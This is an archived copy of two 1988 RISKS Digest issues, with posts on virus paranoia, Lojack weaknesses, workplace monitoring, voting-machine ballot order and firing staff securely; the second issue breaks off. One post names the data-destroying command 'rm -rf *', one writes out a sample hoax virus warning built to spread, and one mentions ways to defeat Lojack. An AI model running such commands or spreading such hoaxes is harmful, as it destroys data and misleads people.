  Hub auto-theft lessons; $$$ risks of Lojack 
</A>
<DD>
<A HREF="#subj6.1">
rdicamil
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: voting 
</A>
<DD>
<A HREF="#subj7.1">
Mike Tanner
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Don't believe everything you read in the papers.
</A>
</H3>
<address>
David Purdue
&lt;<A HREF="mailto:munnari!csadfa.oz.au!davidp@uunet.UU.NET ">
munnari!csadfa.oz.au!davidp@uunet.UU.NET 
</A>&gt;
</address>
<i>
Tue, 9 Feb 88 11:41:46 est
</i><PRE>

The Canberra Times, Wed, Feb 3, 1988, page 3.

				CORRECTION

For some considerable time, The Canberra Times has been publishing the wrong
tide times for Narooma.  The error has been in arithmetical calculation in
this office of the difference between tide times at Fort Denison as published
in standard tide tables and times at Narooma.  The error, the source of which
is lost in antiquity, was discovered last week when the editor, relying on
The Canberra Times figures, was swept out to sea.  But he managed to return
to shore - and ordered this correction.

Mr. David Purdue           Phone ISD: +61 62 68 8165    Fax: +61 62 470702
Dept. Computer Science         Telex: ADFADM AA62030
University College      ACSNET/CSNET: davidp@csadfa.oz
Aust. Defence Force Academy     ARPA: davidp%csadfa.oz@uunet.uu.net
Canberra. ACT. 2600.           JANET: davidp@oz.csadfa
AUSTRALIA             Other Gateways: see CACM 29(10) Oct. 1986
    UUCP: {uunet,hplabs,ubc-vision,nttlab,mcvax,ukc}!munnari!csadfa.oz!davidp

                 [There is no such thing as a shore thing, but 
                 that will tide him over until next time.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Anti-virus software
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue, 09 Feb 88 15:41:28 EST
From: Chuck Weinstock &lt;weinstoc@SEI.CMU.EDU&gt;

There was an ad for anti-virus software for IBM PC's in this past Sunday's
New York Times business section.  Although I didn't call the number in the
ad, my first thought was "what a marvelous way to spread yet another virus."
(Sort of like the cyanide tampered Tylenol, though maybe not as deadly.)

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Virus paranoia [Re: RISKS 6.22/"Macintosh Virus Hits CompuServe"]
</A>
</H3>
<address>
Jeffrey Mogul
&lt;<A HREF="mailto:mogul@decwrl.dec.com ">
mogul@decwrl.dec.com 
</A>&gt;
</address>
<i>
9 Feb 1988 1629-PST (Tuesday)
</i><PRE>

I realize that viruses are becoming a serious problem, but all this virus
paranoia could make the world safe for a kind of "meta-virus."  In RISKS
6.22 we read a recommendation:

    While it is possible to, apparently, "cut" this Resource from infected
    Systems with the Resource Editor THE ONLY SURE COURSE OF ACTION IS TO
    TRASH ANY SYSTEM FILE THAT HAS COME IN CONTACT WITH THIS STACK.

Imagine what would happen if someone sent out this message:

    WARNING! A serious virus is on the loose.  It was hidden in the
    program called 1987TAXFORM that was on this bboard last year.
    This virus does several nasty things:

	(1) Copies itself into several important system programs
		so that it will propagate to other disks
	(2) Copies itself into your own data files so that it can
		infect system programs on other systems
	(3) Keeps track of the files you encrypt and mails copies
		of the cleartext to a bboard in Iowa and a computer
		at the NSA
	(4) Randomly garbles files so that you don't necessarily
		know they are damaged

    By now, it is possible that your system is infected even if you
    didn't download this program, since you could easily have been
    infected indirectly.

    The only safe way to protect yourself against this virus is to
    print all your files onto paper, erase all the disks on your system
    with a demagnetizer, buy fresh software disks from the manufacturer,
    and type in all your data again.  But FIRST! send this message to
    everyone you know, so that they will also follow these steps to
    protect themselves.

The beauty of this "meta-virus" is that it took me about two minutes
to make it really scary and I didn't even have to write any code.

Moral: don't join witch-hunts until you trust the witch-hunter more than you
distrust the alleged witch.
                                            -Jeff Mogul

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Virus on All Things Considered
</A>
</H3>
<address>
&lt;<A HREF="mailto:minow%thundr.DEC@src.dec.com">
minow%thundr.DEC@src.dec.com
</A>&gt;
</address>
<i>
8 Feb 88 20:54
</i><PRE>

There was a report on the computer virus scare on Sunday's (Feb 7, 88)
All Things Considered (public radio news program).  I took the following
notes: don't expect them to be accurate.

Professor Fred Cohen was interviewed.  He claims that the virus will
spread in 1/2 hour through a computer timesharing system and that it
"is a mathematical fact" that you cannot protect against the virus
if you allow sharing, transmission, and general access.

Eric Hanson (Hansen?), a programmer from Minneapolis, blames the problem on
people who lack significance in their lives and gain self-esteem by
manufacturing viruses: a revenge of the nerds.  He [somehow] draws a
parallel with Aids.  (Eric sells a program to test for viruses.  He claims
the government is interested.)
                                             Martin

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
OTA Report: The Electronic Supervisor
</A>
</H3>
<address>
&lt;<A HREF="mailto:wolit@research.att.com">
wolit@research.att.com
</A>&gt;
</address>
<i>
Tue, 9 Feb 88 15:45 EST
</i><PRE>

The U.S. Congress, Office of Technology Assessment recently released a
report on computer-based monitoring in the workplace entitled, "The
Electronic Supervisor: New Technology, New Tensions," OTA-CIT-333
(Washington, DC: U.S. Government Printing Office, September, 1987).

The following is from the Foreword:

    "The Electronic Supervisor: New Technology, New Tensions"
    deals with the use of computer-based technologies to measure
    how fast or how accurately employees work.  New computer-based
    office systems are giving employers new ways to supervise job
    performance and control employees' use of telephones, but such
    systems are also controversial because they generate such
    detailed information about the employees they monitor. 
    This assessment explores a broad range of questions related to
    the use of new technology in the workplace and its effects on
    privacy, civil liberties, and quality of working life.

The assessment reports six findings:

    1.  Computer technology makes possible the continuous
        collection and analysis of management information
        about work performance and equipment use.  This
        information is useful to managers in managing
        resources, planning workloads, and reducing costs.
        When it is applied to individual employees, however,
        the intensity and continuousness of computer-based
        monitoring raises questions about privacy, fairness,
        and quality of work life.
  
    2.  Computer-based systems offer opportunities for
        organizing work in new ways, as well as means of
        monitoring it more intensively.  Electronic monitoring
        is most likely to raise opposition among workers when
        it is imposed without worker participation, when
        standards are perceived as unfair, or when performance
        records are used punitively.  Worker involvement in
        design and implementation of monitoring programs can
        result in greater acceptance by workers, but despite
        activities of labor unions in some industries and
        recent progress in labor-management cooperation in
        others, most firms do not have mechanisms to do this.
  
    3.  There is reason to believe that electronically
        monitoring the quantity or speed of work contributes
        to stress and stress-related illness, although there
        is still little research separating the effects of
        monitoring from job design, equipment design,
        lighting, machine pacing, and other potentially
        stressful aspects of computer-based office work.
  
    4.  Monitoring the content of messages raises a different
        set of issues.  Some employers say that service
        observation (listening to or recording the content of
        employees' telephone conversations with customers)
        helps assure quality and correctness of information
        and by protecting all parties in case of dispute.
        However, service observation also impacts the privacy
        of the customer, and workers and labor organizations
        have argued that it contributes to the stress of the
        employee, and creates an atmosphere of distrust.
        Monitoring the content of electronic mail messages or
        personal computer (PC) diskettes also raises privacy
        issues.
  
    5.  Telephone call accounting (computer-generated records
        of the time, duration, destination, and cost of calls)
        gives employers a powerful tool for managing the costs
        of telephone systems.  However, it raises privacy
        questions when accounting records are used to track
        calling habits of individuals.  Other cost control
        technologies can be used to limit nonbusiness uses of
        telephones, either instead of or in addition to call
        accounting.  Establishing a policy for use of these
        technologies will be especially important for the
        Government as it builds a new Federal Telephone
        System.
  
    6.  Electronic monitoring is only one of a range of
        technologies used in today's workplace to gather
        information about the work process or to predict work
        quality based on personal characteristics of the
        workers.  Many applications of technology, including
        polygraph testing, drug testing, genetic screening,
        and, possibly, brain wave testing, illustrate the
        tension between employers' rights to manage their
        enterprise, reduce costs, and reduce liability, and
        the employees' rights to preserve individual privacy
        and autonomy.  Recent concerns of employers, labor
        unions, civil liberties groups, the courts, and
        individual workers suggest that a range of workplace
        privacy issues are in need of resolution.

A discussion of this report and this topic in general might be
appropriate for this newsgroup.

Jan Wolitzky, AT&amp;T Bell Labs, Murray Hill, NJ; 201 582-2998; mhuxd!wolit
(Affiliation given for identification purposes only)

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Hub auto-theft lessons; $$$ risks of Lojack
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue, 09 Feb 88 18:36:13 -0500
From: rdicamil@CC5.BBN.COM

Just thought folks might be interested in a more real, tangible = $$$ risks of
a system such as lojack. In actuality, depending upon how our insurance policy
is written, you may not want the authorities to find your vehicle very soon
after it's stolen.

One reason is that some policies have a clause that requires the car to be
missing for a certain period of time (days) before it can be covered under
"theft" insurance. [Think of how many people would be reporting stolen cars
without such limits.] Another more compelling reason is that depending upon
the type of thief, unless they do all the damage to your car very quickly
(within 15 mins !!), finding your car soon frequently means the consumer will
pay for most any damage, and not the insurance company.  (This of course
depends upon your level of deductible, and how much damage must be done before
your car is "totalled".)  The insurance companies like lojack for these
perhaps not so obvious reasons.

In Massachussetts (where I live), car theft is a simple misdemeanor.  If
someone take your car for the thrill of joyridding (as oppossed to a pro who
might strip it for parts), it's probable that some but not utterly devastating
damage could be done. Such cosmetic damage can be far more costly settlement
wise, then having your car totalled.

Anyway, apart from the skewed economics, I believe the transmitters are not
terribly difficult to find on some automobiles, especially if your car is
going directly to a junk yard to be stripped. Where the transmitter get's
located is often a function of the intelligence of the mechanic who is
installing it - there is obviously no one standard place to put it on each
make of car! Imagine some archetypical mechanic ("Gee boss, never hid a
transmitter on a Ferrari before...can I try ?")

Note the Lojack system is not an anti-theft device, in that it doesen't
physically do anything to make the car harder to steal; it can however save
the insurance companies money). I would still rather have my "Z-lok" (or
"Chapman" lock).

Of course, anyone who really wants your car will examine it very carefully
before attempting to steal it.  Even a careful flashlight examination cannot
distinguish the exact mechanism attached to the key/collar fitting beneath
most dashes.  Unless of course you take the risk of placing a label on your
car saying you have an alarm system; a label displaying "what kind" of alarm
system is the worst thing you can do.  "This car equipped with `brand X'
electronic protection" provides the truly professional thief with some very
specific information. The best compromise is to find a generic "protected by
alarm system" label, if you feel your car must have one at all.

In summary, "Lojack" may only prove beneficial to the consumer's wallet in the
instance of a highly professional theft, where your car risks being dismantled
within the hour. In this case it really is a race against time, since they
will probably find the transmitter (and be looking for it if you have that
label).

However, if you own THAT KIND of ($$,$$$) car, such caliber of thieves are
usually quite persistent, once they know who you are (or rather where you
live). One of my bosses had his brand new, fully alarmed, 1986 Toyota Celica
removed from his driveway in Beacon Hill by a wench equipped truck in the wee
hours of the morning. He made it out the door only to hear the periodic beep
of his pendulum alarm muffled from inside a large van as it went down the
street. One week later he still got the bill for the excise tax. Lojack might
of helped here. Very clean, very fast - no broken glass - picking up the car
set off the pendulum.  The Boston police could not offer him much consolation
except, "Yup, they wanted your car real bad." Last statistics I saw still rate
Mass.  as the auto-theft capital, with the most stolen cars as (1) Toyota
Celica [GT/turbos] (2) Saab 900 series (3) Porsche's.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: voting
</A>
</H3>
<address>
Mike Tanner
&lt;<A HREF="mailto:tanner@tut.cis.ohio-state.edu ">
tanner@tut.cis.ohio-state.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 8 Feb 88 16:41:02 GMT

The Missouri voting issue brought this up in my mind, but I don't know how
relevant it is to the discussion.

I worked for several years in local politics here in Ohio, primarily doing
polling analysis and election analysis.  In Ohio people normally vote by
pulling levers in a mechanical voting booth then indicate that they are
finished by throwing a huge, red-handled lever which causes the machine to
mechanically tally their votes.  (I don't suppose this is unusual.  You can
also use a paper, punch-type, ballot by getting an "absentee" ballot and
swearing that you will be unable to vote at a normal polling place on election
day.)  The numbers in the machine are copied down by the election workers at
the end of the day, all the numbers from the various precincts in a county are
taken to the county board of elections, where they are typically entered into
a computer which totals them.  There are a number of sources of error, of
course.  But I don't know what the estimated error rate is.  If the race is
closer than 2% or so of the total vote, the candidates are entitled to a free
recount, otherwise they can pay for one, so that might be taken as an error
rate (but that assumes the 2% figure was arrived at rationally).  A recount
consists in manually retracing all the steps of tallying the votes (except
actually revoting), arguing endlessly over discrepancies, and ultimatelly
throwing out results from questionable precincts.

The relevant phenomenon (to the Missouri issue) is that the total number of
votes cast in a given race is strongly correlated with the position of that
race on the ballot in the machine.  (I'm sure this also happens in places
where paper ballots are used.)  Races listed toward the left get more votes
than those toward the right.  This is very predictable and nearly independent
of the visibility factor, i.e., the factor that accounts for the fact that
more people will vote in a Presidential race than in the race for Judge of the
Court of Domestic Relations.  Pick any two races and the one listed to the
left will get more votes.  E.g., County Recorder gets more votes than County
Coroner and Recorder appears just to the left of Coroner.  Not more than one
person in a thousand has the slightest idea what either official does, who the
canditates are, or what the qualifications are for the office.  This hold
across all 88 counties, election after election.

The candidates within each race are in random order across all the machines.
E.g., for each race, 50% of the machines will have the Republican candidate on
the left and the Democrat on the right, 50% will have them reversed.  Many
Ohio pols would like to see a return to straight ballot days, when a person
could simply vote democrat (or republian) by making one mark and vote for all
democrats (or republicans) on the ballot.

Where's the interest for RISKS readers?  I don't know if they're RISKS
exactly but:

	- It indicates that most people don't vote on everything.  So
	  not counting a vote because not all the levers are pulled
	  (or holes punched) probably undercounts a lot of otherwise
	  correct ballots.
	- I have an image of the average voter pulling levers from
	  left to right until he finds himself voting on things he
	  doesn't recognize, begins to lose energy, and finally stops
	  pulling levers and quits.  Maybe we make it too easy to
	  vote.  Many of those tail-end votes a likely to be spurious.
	  But should we scramble the order of races as well as
	  candidates within races?  What difference would that make?
	- Is scrambling the candidate order really a good idea?  What
	  if a lot of democrat-first ballots in a close race found
	  their way (accidentally or on purpose) to a precinct with a
	  large population of independent voters?  Or wherever they
	  could make a difference.  (I wonder if this has ever
	  happened, or even been looked for during recounts.)
	- How much affect does the randomizing algorithm have on the
	  outcomes of elections?  Even with a good algorithm it's
	  possible in any particular election to get lots more
	  republican-first ballots than democrat-first (or vice
	  versa).  Do they keep re-doing it until they get a 50-50
	  split?  If not, would it be grounds for challenging the
	  election, forcing a special election?
	- The randomizing, assigning of ballots to machines, machines
	  to precincts, and the final totalling of votes are all done
	  by various computers.  Some of it is done by the Secretary
	  of State, some in the county Boards of Elections.  But there
	  are many steps done manually, figures copied by hand,
	  ballots hand-carried to voting machines, etc.  But the fact
	  that computers are involved tends to obscure the human
	  factor and the possibilities of human error (or mischief)
	  for causing problems.

-- mike tanner

Dept. of Computer and Info. Science	       tanner@tut.cis.ohio-state.edu
Ohio State University                          ...cbosgd!osu-cis!tut!tanner
2036 Neil Ave Mall, Columbus, OH 43210

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.22.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.24.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-60</DOCNO>
<DOCOLDNO>IA012-000130-B024-179</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.24.html 128.240.150.127 19970217015555 text/html 24526
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:54:17 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 24</TITLE>
<LINK REL="Prev" HREF="/Risks/6.23.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.25.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.23.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.25.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 24</H1>
<H2> Wednesday 10 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Alarming Wenches and Risks of Lojack 
</A>
<DD>
<A HREF="#subj1.1">
Alex Colvin
</A><br>
<A HREF="#subj1.2">
 Scott A. Norton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Software theft 
</A>
<DD>
<A HREF="#subj2.1">
Roy Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Interleaving of Early Warning Systems 
</A>
<DD>
<A HREF="#subj3.1">
Ronni Rosenberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Shuttle Security 
</A>
<DD>
<A HREF="#subj4.1">
Jan Wolitzky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Risk Study Centers 
</A>
<DD>
<A HREF="#subj5.1">
Curtis C. Galloway
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Legal Software testing 
</A>
<DD>
<A HREF="#subj6.1">
David Lesher
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: risks of helpful usenet software 
</A>
<DD>
<A HREF="#subj7.1">
David Herron
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Grants-chaos 
</A>
<DD>
<A HREF="#subj8.1">
F.H.D. van Batenburg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: viruses 
</A>
<DD>
<A HREF="#subj9.1">
Chaz Heritage
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  CompuServe virus - more details et cetera 
</A>
<DD>
<A HREF="#subj10.1">
David HM Spector
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Alarming Wenches (<A HREF="/Risks/6.23.html">RISKS-6.23</A>)
</A>
</H3>
<address>
    Alex Colvin 
&lt;<A HREF="mailto:mac3n@babbage.acc.virginia.edu">
mac3n@babbage.acc.virginia.edu
</A>&gt;
</address>
<i>
Wed, 10 Feb 88 10:28:02 EST
</i><PRE>

  &gt; ... One of my bosses had his brand new, fully alarmed, 1986 Toyota Celica
  &gt; removed from his driveway in Beacon Hill by a wench equipped truck in
  &gt; the wee hours of the morning.

That's the most dangerous kind.  Especially in the wee hours.

                        [Actually I noticed the typo, but liked it so 
                        much I left it as is.  Sic (sic) it to me.  PGN]

</PRE>
<HR><H3><A NAME="subj1.2">
     Re: Hub auto-theft lessons; $$$ risks of Lojack
</A>
</H3>
<address>
"LT Scott A. Norton, USN" 
&lt;<A HREF="mailto:4526P%NAVPGS.BITNET@CUNYVM.CUNY.EDU">
4526P%NAVPGS.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Tue, 09 Feb 88 21:06:52 PST
</i><PRE>

  &gt; ... He made it out the door only to hear the periodic beep
  &gt;of his pendulum alarm muffled from inside a large van ... 

The real point of this message:  Notice how the thieves negated most
of the value of the alarm by putting the car inside a van.  Although
the owner seemed to hear the siren, the thieves could drive through town
without too much attention being drawn to them.  If the van had
been RF shielded, Lojack would have been defeated, too.

What does Lojack use for an antenna in the protected car, anyway?  If it
shared the radio antenna, or had its own, a simple snip could also disable
the protection.

I'm not impressed by the security it provides, and of course there
is the privacy risk to the owner originally mentioned.

LT Scott A. Norton, USN, Naval Postgraduate School, Monterey, CA 93943-5018
4526P@NavPGS.BITNET   4526P@NPS.ARPA

      [Scott also asked for the name of the wench.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: Software theft
</A>
</H3>
<address>
Roy Smith
&lt;<A HREF="mailto:roy%phri@uunet.UU.NET ">
roy%phri@uunet.UU.NET 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 10 Feb 88 15:32:54 GMT
Organization: Public Health Research Inst. (NY, NY)

  &gt; it is extraordinarily bad practice to fire someone and then not change
  &gt; all relevant passwords, revoke their privileges, etc.

Actually, I would quibble with the order of operations.  Change the passwords
first, *then* fire the person.  In the past five or so years, we have had
occasion to fire two people who had access to sensitive material.  In both
cases, accounts were zapped and appropriate passwords were being changed while
that person was in the office getting the bad news.  It doesn't take long for
a disgruntled person to do serious damage with a quick "rm -rf *".

Roy Smith, {allegra,cmcl2,philabs}!phri!roy
System Administrator, Public Health Research Institute
455 First Avenue, New York, NY 10016

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Interleaving of Early Warning Systems
</A>
</H3>
<address>
Ronni Rosenberg
&lt;<A HREF="mailto:ronni@CCA.CCA.COM ">
ronni@CCA.CCA.COM 
</A>&gt;
</address>
<i>
Wed, 10 Feb 88 11:41:00 EST
</i><PRE>

In RISKS 6.22, Ronald Wanttaja discusses a scenario in which "The Soviets
blind most of the US Early Warning satellites. ...  The U.S. immediately goes
to high DEFCON. ...  The Soviets do *nothing*."

I believe that if the U.S. goes to a high DEFCON, the Soviets automatically
go to a higher state of alert.  Part of the danger of such situations is that
the two countries' alert systems are tightly interconnected and responsive to
each other.  This can have the effect of ratcheting the alert status ever
higher and increasing tension, which greatly increases the risk that an
inappropriate decision will be made.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Shuttle Security
</A>
</H3>
<address>
&lt;<A HREF="mailto:wolit@research.att.com">
wolit@research.att.com
</A>&gt;
</address>
<i>
Wed, 10 Feb 88 17:22 EST
</i><PRE>

The subject of the self-destruct mechanism used to prevent runaway rockets
(including space shuttle's boosters) from wreaking havoc was discussed
previously in this discussion group.  One very knowledgeable contributor posted
interesting details of the mechanism, including descriptions of the radio link,
with assurances that the high security of the system, including classification
of the frequencies used, greatly reduced the possibility of inadvertently
blowing up a rocket.

Now, according to the AP, a NASA security audit conducted in September found
serious security violations at NASA's Marshall Space Flight Center in
Huntsville, AL.  The wire service story, of course, focuses on such hijinks as
a safe for classified documents being used to store coffee money, but it also
reports that 7 packages of microfilm classified "Confidential" were left
unsecured for 8 months.  Each package of microfilm contained 181 sheets,
listing 4,205 confidential radio frequencies (personally, I'm always suspicious
of such precise figures).  The information belonged to various of the armed
services, CIA, and NSA.  The MSFC is responsible for processing the shuttle's
solid rocket boosters, which include the self-destruct mechanism.

What does this do to a risk analysis of shuttle safety?  In general, how many
points do you take off for each month the key to your system is laying around
unprotected?  When things like this happen, do people really sit down and redo
those calculations, or do they just run around covering themselves and hope the
same numbers as before still apply?

Jan Wolitzky, AT&amp;T Bell Labs, Murray Hill, NJ; 201 582-2998; mhuxd!wolit
(Affiliation given for identification purposes only)

    [Quantitative risk analysis is always dangerous -- particularly
    if the assumptions are questionable.  The existence of a serious 
    flaw may kill you, or it may lie lurking.  Probabilities are not
    very interesting when you are dead.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Risk Study Centers
</A>
</H3>
<address>
"Curtis C. Galloway" 
&lt;<A HREF="mailto:cg13+@andrew.cmu.edu">
cg13+@andrew.cmu.edu
</A>&gt;
</address>
<i>
Wed, 10 Feb 88 15:23:01 -0500 (EST)
</i><PRE>

From the Carnegie Mellon office of public relations:

  "Carnegie Mellon University has received a $1.2 million grant from the
  National Science Foundation (NSF) to help fund its new Center for Risk
  Perception and Communication, aimed at improving how companies, workers,
  the public and regulatory agencies communicate about and deal with
  significant health and safety factors.

  "The center's experts in engineering, psychology and economics will do
  basic research on risk communication. They will focus on danger areas whose
  hazards have been studied, including radon in homes, highway safety
  associated with seatbelts, dam safety, the potential for birth defects and
  cancer from power lines, and cancer risks from sun light and chemicals in
  the environment."  

I wonder if they will include in their research the risks to the public in
computers and related systems...  Have "hazards been studied" in this
"danger area?"  It seems to me that there is a distinct lack of
communication about the risks of using computers (with the exception of the
RISKS digest, of course!)

Curt Galloway                 ARPA: cg13+@andrew.cmu.edu
UUCP: ...!{seismo, ucbvax, harvard}!andrew.cmu.edu!cg13+

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 Legal Software testing (Re: <A HREF="/Risks/6.22.html">RISKS-6.22</A>)
</A>
</H3>
<address>
David Lesher
&lt;<A HREF="mailto:netsys!wb8foz@ames.arc.nasa.gov ">
netsys!wb8foz@ames.arc.nasa.gov 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 10 Feb 88 03:57:34 GMT
Organization: NetSys Public Access Network

Ms. Leveson neglected to mention the big problem with the ABA testing
program. They charge many thousands of dollars for such an approval, and
many small vendors can't/won't pay up.  Hence, only large, well funded,
companies offer 'approved' products.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: risks of helpful usenet software
</A>
</H3>
<address>
David Herron -- Resident E-mail Hack 
&lt;<A HREF="mailto:david@ms.uky.edu">
david@ms.uky.edu
</A>&gt;
</address>
<i>

</i><PRE>
Date: 9 Feb 88 18:04:55 GMT
Organization: U of Kentucky, Mathematical Sciences

Henry's comment about new vs. old usenet software hit home very strongly
with me.  I made a posting a couple of weeks ago advertising that we had
perl available, and I cross-posted it to comp.sources.d, uk.wanted,
ky.general and uk.general.  Ever since I've been getting mail from machines
all over the net which thought that one of those newsgroups was moderated.
I've probably gotten over a hundred by now.

Each of these machines is an "older" one from back when the rules were a
little bit different, and there were some hard-wired newsgroup names which
were moderated.  Or rather, their news software is "older" software... :-)

David Herron -- The E-Mail guy            &lt;david@ms.uky.edu&gt;
or:                {rutgers,uunet,cbosgd}!ukma!david, david@UKMA.BITNET

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Grants-chaos
</A>
</H3>
<address>
    
&lt;<A HREF="mailto:SBQBEB%HLERUL57.BITNET@CUNYVM.CUNY.EDU">
SBQBEB%HLERUL57.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Wed, 10 Feb 88 14:31 N
</i><PRE>

In the Netherlands students are supported by the government with a small
grant to live on, augmented with a low interest loan which should be paid
back later.  The amount of money depends upon the wealth of one's parents,
the study results and many many more factors.

In fact, this legislation was so complex that the brochures which were
distributed by the government to the universities only covered the most
simple cases.  After heated complaints from the universities the government
finally produced and distributed a MS-DOS program to assist the information
officers at the universities.  However, this program seemed to give correct
information only once out of six questions (NRC 14/8/87), so it was soon
called the "Deet-flop" (Deetman being the responsible minister and flop
having the connotation of failure).  Clearly this program was of debatable
value so desperate universities appointed a number of students to assist the
information desks and some of those students finally produced in their spare
time a much better program than the Deet-flop.  This is in use now in the
universities.

However the real pain in the neck was not the governmental information, but the
department responsible for the actual distribution of loans and grants itself.

* R.Schipper, one of my students, showed me a letter which cut him out of any
  funds because the department assumed he had earned the ridiculous huge sum of
  f 756025.00 (about $400000) instead of f 756.25 in july alone.

* Another student was cut out of funds because her father was too rich last
  year.  The fact that he got broke recently and was virtually pennyless now
  did not change anything.

* Another 2 students told me they just reported a change of address.  This
  resulted in a temporary (9 month for one of them) stop of payment until the
  computer program could handle the update of this information.

* Some students who quit studying still got their monthly payments although
  they had reported their new status properly (Computable 19/1/88).

